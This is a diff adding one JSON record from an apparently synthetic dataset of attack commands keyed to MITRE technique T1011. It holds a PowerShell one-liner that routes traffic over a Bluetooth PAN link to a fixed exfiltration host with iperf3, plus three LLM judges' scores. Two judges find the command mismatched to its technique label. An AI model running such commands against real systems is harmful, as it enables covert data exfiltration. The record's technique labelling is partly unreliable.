@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$route='172.31.199.2'; $bt=Get-NetAdapter -Name 'Bluetooth Network Connection' -ErrorAction Stop; $gw=(Get-NetIPConfiguration -InterfaceIndex $bt.ifIndex).IPv4DefaultGateway.NextHop; if($gw){cmd /c \"route add $route mask 255.255.255.255 $gw metric 5 if $($bt.ifIndex)\"}; $lip=(Get-NetIPAddress -InterfaceIndex $bt.ifIndex -AddressFamily IPv4).IPAddress; iperf3.exe -c $route -p 55777 -B $lip -t 60",
+  "explanation": "Adds a host route via the Bluetooth PAN gateway to force traffic over the Bluetooth medium, then runs iperf3 bound to that interface to exfiltrate over TCP on an uncommon port (T1011).",
+  "rationale_steps": [
+    "Determine Bluetooth PAN interface and its default gateway.",
+    "Add a specific host route so only the exfil server traffic uses Bluetooth.",
+    "Bind iperf3 to the Bluetooth address and use a high TCP port.",
+    "Limit impact by scoping the route to a single destination."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-9a2e4ef2",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes and parentheses, appropriate error handling with -ErrorAction, and correct command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with T1011 by establishing an exfiltration channel over Bluetooth using iperf3 on a specific port, though it's more aligned with exfiltration over alternative protocol rather than dynamic resolution specifically.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:24:12.814273Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct PowerShell syntax for variable assignment, cmdlet execution, conditional logic, string interpolation, and native command execution.",
+        "semantic_score": 1,
+        "semantic_justification": "The command targets a static IP address and establishes a static route, which directly contradicts the 'Dynamic Resolution' aspect of T1011, and the `route add` command requires administrative privileges not accounted for in the prompt's 'Privilege: None' claim.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:24:24.546297Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell statements are correctly separated, quoting and parentheses are balanced, variable interpolation is valid, and the cmd route syntax is well-formed.",
+        "semantic_score": 1,
+        "semantic_justification": "The command sets a static host route and runs iperf3 to a fixed IP (no DGA/DNS or rotating endpoints), which does not implement Dynamic Resolution, and route changes typically require admin rights.",
+        "combined_score": 3.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:24:59.680447Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.0,
+    "llm_average_score": 3.5,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
